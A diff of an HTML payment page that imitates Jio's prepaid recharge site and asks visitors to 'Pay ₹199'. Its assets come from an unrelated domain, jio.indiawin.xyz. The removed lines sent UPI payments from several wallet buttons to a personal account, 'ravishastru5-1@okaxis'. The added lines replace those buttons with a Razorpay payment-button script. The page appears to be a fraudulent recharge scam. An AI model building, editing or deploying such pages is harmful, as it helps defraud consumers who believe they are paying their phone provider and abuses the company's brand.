@@ -1,16 +1,17 @@
 <!DOCTYPE html>
-<html style="height: 100%">
+<html style="height:100%">
+
 
 <head>
     <meta charset="utf-8">
     <link rel="icon" href="Assets/Images/Reliance_Jio_Logo.svg.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="theme-color" content="#000000">
-    <title>Jio - Best Prepaid, Postpaid Plans</title>
+    <title>Jio - Best Prepaid, Postpaid Plans</title>    
     <link rel="stylesheet" href="Assets/CSS/recharge.css">
 </head>
 
-<body>
+<body cz-shortcut-listen="true" class="">
     <div id="root">
         <div class="py-4 px-6 bg-blue-700 flex items-center justify-between text-white">
             <div class="flex items-center">
@@ -35,50 +36,26 @@
                 </svg>
             </div>
         </div>
-        <div>
+        <div class="">
             <div class="py-1 px-[10px] my-5">
                 <div class="flex space-x-4 bg-white border border-slate-200 rounded-xl w-full p-2">
                     <ul class="w-full">
                         <h1 style="margin-bottom: 20px;max-width: 102%;font-size: 17px;margin-right: 38%;margin-left: 38%;">Pay ₹199</h1>
-                        <li id="googlepay" class="w-full my-2">
-                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="upi://pay?cu=INR&pa=ravishastru5-1@okaxis&pn=Jiorecharge&tn=&am=199.00">
-                                <img src="https://jio.indiawin.xyz/static/media/googlepayicon.b1d2f2a111a2f792233c10265d1f0cbd.svg" class="w-10" alt="">
-                                <span class="ml-3 text-lg">Google Pay</span>
-                            </a>
-                        </li>
-                        <li id="paytm" class="w-full my-2">
-                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="upi://pay?cu=INR&pa=ravishastru5-1@okaxis&pn=Jiorecharge&tn=&am=199.00">
-                                <img src="https://jio.indiawin.xyz/static/media/paytm_icon.3d48b89988f13e784e647886decd7ae5.svg" class="w-10" alt="">
-                                <span class="ml-3 text-lg">Paytm</span>
-                            </a>
-                        </li>
-                        <li id="phonepe" class="w-full my-2">
-                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="upi://pay?cu=INR&pa=ravishastru5-1@okaxis&pn=Jiorecharge&tn=&am=199.00">
-                                <img src="https://jio.indiawin.xyz/static/media/phonepeicon.e79785763e0c4095b6335e54e9971960.svg" class="w-10" alt="">
-                                <span class="ml-3 text-lg">PhonePe</span>
-                            </a>
-                        </li>
                         <li id="otherupi" class="w-full my-2">
-                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="upi://pay?cu=INR&pa=ravishastru5-1@okaxis&pn=Jiorecharge&tn=&am=199.00">
+                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
                                 <img src="https://jio.indiawin.xyz/static/media/upilogo.d3c1e2271fc50a058ee6.jpeg" class="w-10" alt="">
-                                <span class="ml-3 text-lg">Other UPI</span>
+                                <span class="ml-3 text-lg">UPI</span>
+                                <input type="checkbox" checked disabled style="accent-color: #0A2885; margin-left: 10px;">
                             </a>
                         </li>
-                        <li id="whatsapppay" class="w-full my-2">
-                            <a class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full" href="upi://pay?cu=INR&pa=ravishastru5-1@okaxis&pn=Jiorecharge&tn=&am=199.00">
-                                <img src="https://jio.indiawin.xyz/static/media/whatspp_pay.e2ed34befa5836e5a0be68764c2ee95f.svg" class="w-10" alt="">
-                                <span class="ml-3 text-lg">Whatsapp Pay</span>
-                            </a>
-                        </li>
+                        <div class="flex justify-center mb-50" style="margin-top: 150px;">
+                            <form><script src="https://checkout.razorpay.com/v1/payment-button.js" data-payment_button_id="pl_OQuPYiZ02AJIjU" async> </script> </form>
+                        </div>
                     </ul>
                 </div>
             </div>
-            <div class="mt-5">
-                <img src="/static/media/secured.20c7b7cea9439246796c.jpg" alt="">
-                <img src="/static/media/lasttwo.bfe814c92613f117536e.jpg" alt="">
-            </div>
         </div>
     </div>
+    
 </body>
-
 </html>
